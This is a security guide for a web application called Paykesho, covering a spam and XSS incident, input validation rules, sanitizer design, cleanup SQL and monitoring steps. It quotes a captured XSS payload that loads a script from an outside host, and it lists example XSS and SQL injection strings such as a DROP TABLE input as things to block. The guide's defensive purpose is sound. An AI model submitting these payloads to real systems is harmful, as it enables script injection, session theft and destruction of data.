# Paykesho Security Guide

## Overview
This guide provides comprehensive security measures implemented in the Paykesho system to protect against common web vulnerabilities including XSS (Cross-Site Scripting), SQL Injection, and other malicious attacks.

## Table of Contents
1. [Recent Security Incident](#recent-security-incident)
2. [Security Measures Implemented](#security-measures-implemented)
3. [Input Validation](#input-validation)
4. [Protection Against Common Attacks](#protection-against-common-attacks)
5. [Database Cleanup](#database-cleanup)
6. [Best Practices](#best-practices)
7. [Monitoring and Detection](#monitoring-and-detection)

---

## Recent Security Incident

### Identified Attacks
Two malicious records were identified in the `clients` table:

**Record ID 4** - Spam/Advertisement Attack
- Email: `kertyucds@onet.eu`
- Address: `https://buyviagraonlinet.com/`
- Name: `MiguelHah`
- Issue: Spam URL in address field, suspicious data

**Record ID 6** - XSS Attack
- Email: `Nocal@mail.com`
- Name: `<sCRiPt/sRC=//l01.co/1/></sCrIpT>Nocal`
- Issue: JavaScript injection attempt in name field

### Impact
These attacks could have led to:
- **XSS Attacks**: Execution of malicious JavaScript in user browsers
- **Data Theft**: Stealing user credentials or session tokens
- **Phishing**: Redirecting users to malicious websites
- **Database Pollution**: Filling database with spam data

---

## Security Measures Implemented

### 1. Bean Validation Annotations

All client entity fields now have strict validation rules:

```java
// Client.java
@NotBlank(message = "Name is required")
@Size(min = 2, max = 245, message = "Name must be between 2 and 245 characters")
@Pattern(regexp = "^[a-zA-Z\\s'-]+$", message = "Name can only contain letters, spaces, hyphens and apostrophes")
private String name;

@NotBlank(message = "Email is required")
@Email(message = "Invalid email format")
private String email;

@NotBlank(message = "Phone number is required")
@Pattern(regexp = "^[0-9+\\-\\s()]{7,15}$", message = "Invalid phone number format")
private String phoneNumber;

@NotBlank(message = "Address is required")
@Size(min = 5, max = 150, message = "Address must be between 5 and 150 characters")
@Pattern(regexp = "^[a-zA-Z0-9\\s,.-]+$", message = "Address contains invalid characters")
private String address;

@NotBlank(message = "NRC is required")
@Pattern(regexp = "^[0-9]{6}/[0-9]{2}/[0-9]{1}$", message = "NRC must be in format XXXXXX/XX/X")
private String nrc;

@NotBlank(message = "TPIN is required")
@Pattern(regexp = "^[0-9]{10}$", message = "TPIN must be exactly 10 digits")
private String tpin;
```

### 2. Input Sanitization

Created `InputSanitizer` utility class that:
- Removes HTML tags and script tags
- Encodes special characters
- Detects XSS patterns
- Detects SQL injection patterns
- Sanitizes specific field types (names, addresses, emails, etc.)

**Example Usage:**
```java
String safeName = InputSanitizer.sanitizeName(userInput);
String safeEmail = InputSanitizer.sanitizeEmail(emailInput);
boolean isMalicious = InputSanitizer.containsXSSPatterns(input);
```

### 3. Security Validator

Created `SecurityValidator` service that:
- Validates entire client objects
- Throws `SecurityException` when malicious content is detected
- Logs all security violations
- Automatically sanitizes all fields

**Example Usage:**
```java
try {
    SecurityValidator.validateAndSanitizeClient(client);
} catch (SecurityException se) {
    log.error("SECURITY VIOLATION: {}", se.getMessage());
    throw new RuntimeException("Invalid input detected");
}
```

### 4. Controller-Level Validation

All controllers now use `@Valid` annotation:
```java
@PostMapping("/save-client")
public String signUpClient(@Valid Client client, Model model) {
    // Bean validation happens automatically
    clientService.registerClient(client);
}
```

---

## Input Validation

### Validation Rules by Field

| Field | Format | Example | Validation Pattern |
|-------|--------|---------|-------------------|
| Name | Letters, spaces, hyphens, apostrophes | `John O'Brien` | `^[a-zA-Z\\s'-]+$` |
| Email | Valid email format | `user@example.com` | Email validator |
| Phone | Numbers, +, -, (), spaces | `+260 971 684 296` | `^[0-9+\\-\\s()]{7,15}$` |
| Address | Alphanumeric, spaces, commas, dots, hyphens | `Plot 1, Main Street` | `^[a-zA-Z0-9\\s,.-]+$` |
| NRC | Format: XXXXXX/XX/X | `364205/10/1` | `^[0-9]{6}/[0-9]{2}/[0-9]{1}$` |
| TPIN | Exactly 10 digits | `1003060012` | `^[0-9]{10}$` |
| MAN Number | Up to 10 digits | `009277` | `^[0-9]{1,10}$` |

---

## Protection Against Common Attacks

### 1. Cross-Site Scripting (XSS)

**Detects and blocks:**
- `<script>` tags
- `javascript:` protocol
- Event handlers (`onclick`, `onerror`, etc.)
- `<iframe>`, `<embed>`, `<object>` tags

**Example blocked inputs:**
```
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
javascript:alert('XSS')
<iframe src="evil.com"></iframe>
```

### 2. SQL Injection

**Detects patterns like:**
- SQL keywords (`SELECT`, `INSERT`, `UPDATE`, `DELETE`, `DROP`)
- Comment markers (`--`, `/*`, `*/`)
- SQL operators (`UNION`, `OR 1=1`)

**Example blocked inputs:**
```
' OR '1'='1
admin'--
'; DROP TABLE clients;--
UNION SELECT * FROM users
```

### 3. Spam and Malicious URLs

**Blocks:**
- URLs in address fields
- Suspicious domain names
- Known spam patterns

---

## Database Cleanup

### Immediate Actions Required

1. **Backup your database:**
```bash
mysqldump paykesho_db > paykesho_backup_$(date +%Y%m%d).sql
```

2. **Run the cleanup script:**
```bash
mysql -u your_user -p paykesho_db < migrations/scripts/cleanup_malicious_data.sql
```

3. **Review identified malicious records:**
```sql
SELECT * FROM paykesho_db.clients WHERE id IN (4, 6);
```

4. **Delete confirmed malicious records:**
```sql
DELETE FROM paykesho_db.clients WHERE id = 4;  -- Spam record
DELETE FROM paykesho_db.clients WHERE id = 6;  -- XSS attack
```

5. **Verify cleanup:**
```sql
SELECT COUNT(*) FROM paykesho_db.clients 
WHERE name REGEXP '<[^>]*>|javascript:|on[a-z]+=';
```

---

## Best Practices

### For Developers

1. **Always use `@Valid` annotation** on controller parameters
2. **Never trust user input** - validate and sanitize everything
3. **Use parameterized queries** - avoid string concatenation in SQL
4. **Log security violations** - monitor for attack patterns
5. **Keep dependencies updated** - patch security vulnerabilities
6. **Use HTTPS** - encrypt data in transit
7. **Implement CSRF protection** - prevent cross-site request forgery
8. **Use Content Security Policy (CSP)** - prevent XSS execution

### For Administrators

1. **Monitor logs regularly** for security alerts
2. **Review database** periodically for suspicious data
3. **Keep backups** - regular automated backups
4. **Update system regularly** - apply security patches
5. **Use strong passwords** - enforce password policies
6. **Limit database access** - principle of least privilege
7. **Enable audit logging** - track all database changes

### For Users

1. **Never include scripts** in form fields
2. **Use valid email addresses** - proper format
3. **Provide genuine information** - no spam
4. **Report suspicious activity** - contact support

---

## Monitoring and Detection

### Security Logs

All security violations are logged with:
- Timestamp
- Field name
- Malicious input (truncated)
- Attack type (XSS, SQL Injection, etc.)
- User IP (if available)

**Example log entry:**
```
ERROR: SECURITY ALERT: XSS attempt in name field: <sCRiPt/sRC=//l01.co/1/></sCrIpT>Nocal
ERROR: SECURITY VIOLATION during client registration: XSS pattern detected in name field
```

### Log Locations

- **Application logs:** `webparent/*/logs/`
- **Security alerts:** Search for "SECURITY ALERT" or "SECURITY VIOLATION"
- **Database logs:** MySQL error logs

### Monitoring Commands

**Search for security violations:**
```bash
# Linux/Mac
grep -r "SECURITY ALERT" webparent/*/logs/
grep -r "SECURITY VIOLATION" webparent/*/logs/

# Windows PowerShell
Select-String -Path "webparent\*\logs\*" -Pattern "SECURITY ALERT"
Select-String -Path "webparent\*\logs\*" -Pattern "SECURITY VIOLATION"
```

**Check database for suspicious data:**
```sql
-- Run daily/weekly
SELECT id, name, email, address, created_time 
FROM paykesho_db.clients 
WHERE name REGEXP '<[^>]*>|javascript:'
   OR address REGEXP 'https?://'
   OR nrc NOT REGEXP '^[0-9]{6}/[0-9]{2}/[0-9]{1}$';
```

---

## Additional Security Measures

### 1. Rate Limiting
Consider implementing rate limiting to prevent:
- Brute force attacks
- Spam registration
- DDoS attacks

### 2. CAPTCHA
Add CAPTCHA to registration forms to prevent:
- Bot registrations
- Automated attacks

### 3. Two-Factor Authentication (2FA)
Implement 2FA for:
- Admin accounts
- High-privilege users

### 4. Security Headers
Configure web server with security headers:
- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: DENY`
- `X-XSS-Protection: 1; mode=block`
- `Content-Security-Policy: default-src 'self'`

### 5. Database Security
- Use prepared statements (already implemented with JPA)
- Encrypt sensitive data at rest
- Regular security audits
- Implement row-level security

---

## Incident Response Plan

If you detect a security breach:

1. **Immediate Actions**
   - Isolate affected systems
   - Stop the attack (block IP, disable account)
   - Preserve evidence (logs, database state)

2. **Investigation**
   - Review logs for attack patterns
   - Identify compromised data
   - Determine attack vector

3. **Cleanup**
   - Remove malicious data
   - Patch vulnerabilities
   - Restore from backup if necessary

4. **Recovery**
   - Apply security fixes
   - Update validation rules
   - Notify affected users (if applicable)

5. **Prevention**
   - Document the incident
   - Update security measures
   - Train team on new threats

---

## Testing Security Measures

### Test Valid Inputs (Should Pass)
```
Name: "John Smith"
Email: "john@example.com"
Address: "Plot 123, Main Street, Lusaka"
NRC: "364205/10/1"
TPIN: "1003060012"
```

### Test Invalid Inputs (Should Fail)
```
Name: "<script>alert('XSS')</script>"
Email: "test<>@test.com"
Address: "https://spam.com"
NRC: "INVALID"
TPIN: "abc123"
```

---

## Support and Questions

For security concerns or questions:
- Review this document
- Check application logs
- Contact the development team
- Report security vulnerabilities privately

**Remember: Security is everyone's responsibility!**

---

## Version History

- **v1.0** (Current) - Initial security implementation
  - Added input validation
  - Implemented sanitization
  - Created security validators
  - Added security logging
  - Created cleanup scripts

---

*Last Updated: [Current Date]*
*Maintained by: Paykesho Development Team*

